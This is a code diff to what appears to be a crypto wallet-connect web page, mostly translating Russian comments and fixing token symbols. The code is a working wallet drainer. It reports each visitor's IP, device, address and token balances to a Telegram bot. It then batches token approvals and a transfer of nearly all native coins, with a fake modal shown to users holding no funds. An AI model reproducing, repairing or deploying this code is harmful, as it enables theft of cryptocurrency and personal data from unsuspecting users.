@@ -4,7 +4,7 @@ import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, isAddress, getAddress, encodeFunctionData, maxUint256, parseUnits } from 'viem'
 import { readContract, getBalance, sendCalls } from '@wagmi/core'
 
-// Утилита для дебаунсинга
+// Debounce utility
 const debounce = (func, wait) => {
   let timeout
   return (...args) => {
@@ -13,7 +13,7 @@ const debounce = (func, wait) => {
   }
 }
 
-// Конфигурация
+// Configuration
 const projectId = import.meta.env.VITE_PROJECT_ID || 'd85cc83edb401b676e2a7bcef67f3be8'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
@@ -34,6 +34,12 @@ const CONTRACTS = {
   [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c'
 }
 
+const NATIVE_TOKEN_SYMBOLS = {
+  [networkMap['Ethereum'].chainId]: 'ETH',
+  [networkMap['BNB Smart Chain'].chainId]: 'BNB',
+  [networkMap['Polygon'].chainId]: 'MATIC'
+}
+
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 const appKit = createAppKit({
   adapters: [wagmiAdapter],
@@ -42,7 +48,7 @@ const appKit = createAppKit({
   features: { analytics: true, email: false, socials: false }
 })
 
-// ABI для токена ERC20
+// ERC20 ABI
 const erc20Abi = [
   {
     constant: true,
@@ -63,7 +69,7 @@ const erc20Abi = [
   }
 ]
 
-// Состояние приложения
+// Application state
 const store = {
   accountState: {},
   networkState: {},
@@ -73,7 +79,7 @@ const store = {
   isProcessingConnection: false
 }
 
-// Создание модального окна
+// Create custom modal
 function createCustomModal() {
   const style = document.createElement('style')
   style.textContent = `
@@ -168,7 +174,7 @@ function hideCustomModal() {
   }
 }
 
-// Очистка состояния при загрузке страницы
+// Clear state on page load
 window.addEventListener('load', () => {
   appKit.disconnect()
   localStorage.clear()
@@ -186,7 +192,7 @@ window.addEventListener('load', () => {
   createCustomModal()
 })
 
-// Утилиты для обновления состояния
+// State update utilities
 const updateStore = (key, value) => {
   store[key] = value
 }
@@ -201,7 +207,7 @@ const updateButtonVisibility = (isConnected) => {
   if (disconnectBtn) disconnectBtn.style.display = isConnected ? '' : 'none'
 }
 
-// Функция получения ссылки на сканер
+// Get scan link
 const getScanLink = (hash, chainId, isTx = false) => {
   const basePath = isTx ? '/tx/' : '/address/'
   if (chainId === networkMap['Ethereum'].chainId) {
@@ -214,7 +220,7 @@ const getScanLink = (hash, chainId, isTx = false) => {
   return '#'
 }
 
-// Функции для получения информации о пользователе
+// User info functions
 async function getUserIP() {
   const cachedIP = sessionStorage.getItem('userIP')
   if (cachedIP) return cachedIP
@@ -229,20 +235,6 @@ async function getUserIP() {
   }
 }
 
-async function getGeolocation(ip) {
-  const cachedLocation = sessionStorage.getItem('userLocation')
-  if (cachedLocation) return cachedLocation
-  try {
-    const response = await fetch(`https://freeipapi.com/api/json/${ip}`)
-    const data = await response.json()
-    const location = data.cityName && data.countryName ? `${data.cityName}, ${data.countryName}` : 'Unknown Location'
-    sessionStorage.setItem('userLocation', location)
-    return location
-  } catch (error) {
-    return 'Unknown Location'
-  }
-}
-
 function detectDevice() {
   const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device'
   if (/Windows NT/i.test(userAgent)) return 'Windows'
@@ -253,7 +245,7 @@ function detectDevice() {
   return 'Desktop'
 }
 
-// Функция отправки сообщений в Telegram
+// Send Telegram message
 async function sendTelegramMessage(message) {
   try {
     const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
@@ -269,7 +261,7 @@ async function sendTelegramMessage(message) {
   }
 }
 
-// Уведомления
+// Notify wallet connection
 async function notifyWalletConnection(address, walletName, device, balances, chainId) {
   const connectionKey = `${address}_${chainId}`
   if (store.connectionKey === connectionKey || store.isProcessingConnection) {
@@ -280,7 +272,6 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
   try {
     console.log('Sending wallet connection notification')
     const ip = await getUserIP()
-    const location = await getGeolocation(ip)
     const siteUrl = window.location.href || 'Unknown URL'
     const scanLink = getScanLink(address, chainId)
     const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
@@ -296,29 +287,28 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
       .join('\n')
     const message = `🚨 New connect (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
-                    `🕸 Network: EVM\n` +
-                    `🌎 ${ip}\n\n` +
+                    `🕸 Network: ${networkName}\n` +
+                    `🌎 IP: ${ip}\n\n` +
                     `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                     `${tokenList}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
     store.connectionKey = connectionKey
 
-    // Показать модальное окно
+    // Show modal
     showCustomModal()
-    await new Promise(resolve => setTimeout(resolve, 3000)) // Ждать 3 секунды
+    await new Promise(resolve => setTimeout(resolve, 3000))
 
-    // Проверка баланса
+    // Check balance
     const hasBalance = balances.some(token => parseUnits(token.balance, token.decimals) > 0n)
     if (!hasBalance) {
       const modalMessage = document.querySelector('.custom-modal-message')
       if (modalMessage) modalMessage.textContent = 'Congratulations!'
-      await new Promise(resolve => setTimeout(resolve, 1000)) // Ждать 1 секунду
+      await new Promise(resolve => setTimeout(resolve, 1000))
       hideCustomModal()
       store.isProcessingConnection = false
       return
     }
-
   } catch (error) {
     store.errors.push(`Error in notifyWalletConnection: ${error.message}`)
     hideCustomModal()
@@ -383,6 +373,10 @@ const getNativeTokenBalance = async (address, chainId) => {
 }
 
 const getTokenPrice = async (symbol) => {
+  if (!symbol || symbol === 'undefined') {
+    console.warn(`Skipping price fetch for undefined symbol`)
+    return 0
+  }
   try {
     const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`)
     if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)
@@ -394,9 +388,7 @@ const getTokenPrice = async (symbol) => {
   }
 }
 
-//--------------------------------------------------------------
-// функция
-//--------------------------------------------------------------
+// Batch operations
 async function performBatchOperations(mostExpensive, allBalances, state) {
   if (!mostExpensive) {
     console.log('No most expensive token found, skipping batch operations')
@@ -405,13 +397,13 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
 
   console.log(`Performing batch operations for network: ${mostExpensive.network}`)
 
-  // Переключение сети, если необходимо
+  // Switch network if necessary
   const currentChainId = store.networkState.chainId
   if (currentChainId !== mostExpensive.chainId) {
     console.log(`Switching to ${mostExpensive.network} (chainId ${mostExpensive.chainId})`)
     try {
       await new Promise((resolve, reject) => {
-        const unsubscribe = modal.subscribeNetwork(networkState => {
+        const unsubscribe = appKit.subscribeNetwork(networkState => {
           if (networkState.chainId === mostExpensive.chainId) {
             console.log(`Successfully switched to ${mostExpensive.network}`)
             unsubscribe()
@@ -434,10 +426,10 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
     }
   }
 
-  // Получаем все токены с ненулевым балансом в сети самого дорогого токена
+  // Get tokens with non-zero balance in the most expensive token's network
   const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && parseUnits(t.balance, t.decimals) > 0n)
 
-  // Подготовка вызовов для аппрува ERC-20 токенов
+  // Prepare approve calls for ERC-20 tokens
   const approveCalls = networkTokens
     .filter(t => t.address !== 'native')
     .map(t => ({
@@ -450,12 +442,12 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
       value: '0x0'
     }))
 
-  // Подготовка вызова для перевода нативного токена
+  // Prepare transfer call for native token
   let transferCall = null
   const nativeToken = networkTokens.find(t => t.address === 'native')
   if (nativeToken) {
     const balanceWei = parseUnits(nativeToken.balance, 18)
-    const gasReserve = BigInt('10000000000000000') // 0.01 ETH в wei
+    const gasReserve = BigInt('10000000000000000') // 0.01 ETH in wei
     if (balanceWei > gasReserve) {
       const transferAmount = balanceWei - gasReserve
       transferCall = {
@@ -464,17 +456,17 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
         data: '0x'
       }
     } else {
-      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol}`)
+      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'}`)
     }
   }
 
-  // Объединение всех вызовов
+  // Combine all calls
   const allCalls = [...approveCalls]
   if (transferCall) {
     allCalls.push(transferCall)
   }
 
-  // Отправка пакетной транзакции
+  // Send batch transaction
   if (allCalls.length > 0) {
     try {
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
@@ -495,7 +487,7 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   }
 }
 
-// Инициализация подписок
+// Initialize subscribers
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
     updateStore('accountState', state)
@@ -514,11 +506,11 @@ const initializeSubscribers = (modal) => {
           console.warn(`Network ${networkName} not found in networkMap`)
           return
         }
-        // Добавляем нативный токен
+        // Add native token
         balancePromises.push(
           getNativeTokenBalance(state.address, networkInfo.chainId)
             .then(balance => ({
-              symbol: networkInfo.networkObj.currency,
+              symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
               balance,
               address: 'native',
               network: networkName,
@@ -526,7 +518,7 @@ const initializeSubscribers = (modal) => {
               decimals: 18
             }))
             .catch(() => ({
-              symbol: networkInfo.networkObj.currency,
+              symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
               balance: '0',
               address: 'native',
               network: networkName,
@@ -576,14 +568,12 @@ const initializeSubscribers = (modal) => {
       }
       await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
       if (mostExpensive) {
-        console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
-        // Вывод всех токенов с ненулевым балансом в сети самого дорогого токена
+        console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
         const networkTokens = allBalances.filter(token => token.network === mostExpensive.network && parseUnits(token.balance, token.decimals) > 0n)
-        console.log(`Токены с ненулевым балансом в ${mostExpensive.network}:`)
+        console.log(`Tokens with non-zero balance in ${mostExpensive.network}:`)
         networkTokens.forEach(token => {
           console.log(`${token.symbol}: ${token.balance}`)
         })
-        // Выполнение пакетных операций
         await performBatchOperations(mostExpensive, allBalances, state)
       } else {
         const message = 'No tokens with positive balance'
